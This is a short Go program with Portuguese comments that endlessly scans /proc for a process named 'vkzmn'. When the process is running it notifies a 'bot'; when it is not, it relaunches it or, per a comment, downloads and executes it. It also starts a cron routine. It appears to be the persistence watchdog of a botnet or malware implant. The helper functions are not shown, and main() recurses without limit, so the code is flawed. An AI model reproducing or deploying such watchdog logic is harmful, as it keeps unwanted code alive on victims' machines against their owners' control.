package main



import (


"os"
"io/ioutil"
"fmt"
"strings"
"time"
)


//esse e o monitor ele ficara em um loop infinito  verificando se  o vkzmn esta em execucao


func   main (){



go  cron()


time.Sleep(1  *  time.Second)


var vkzmn_ok int   = 0


dir ,   err := os.Open("/proc") //abre o diretorio /proc


if(err != nil){


fmt.Println("error em open")


}


file , err := dir.Readdir(0) //ler os arquivos e direorios dentro de /proc

if(err != nil){


fmt.Println("erro em dir")

}


for _,  fi := range file{  //intera sobre os diretorio

procs_cmdline  := fmt.Sprintf("/proc/%s/cmdline", fi.Name()) //constroi o caminho pra pega o cmdline dos processos em execucao

read_procs , err := ioutil.ReadFile(procs_cmdline)

if (err != nil ) {

fmt.Println("") //error em readall

}

str_proc :=  string(read_procs)

out := strings.Contains(str_proc, "vkzmn")


if  out == true {


vkzmn_ok  =   23

}
}

if  vkzmn_ok == 23 {



//fmt.Println("   vkzmn em execucao    ")


//notique o  bot !!



time.Sleep(10 * time.Second)


bot()



main()


} else  {


fmt.Println("vkzmn nao ta em execucao")


//execute vkzmn  ou abaixe e execute 




go exec_vk()




}


main()

}


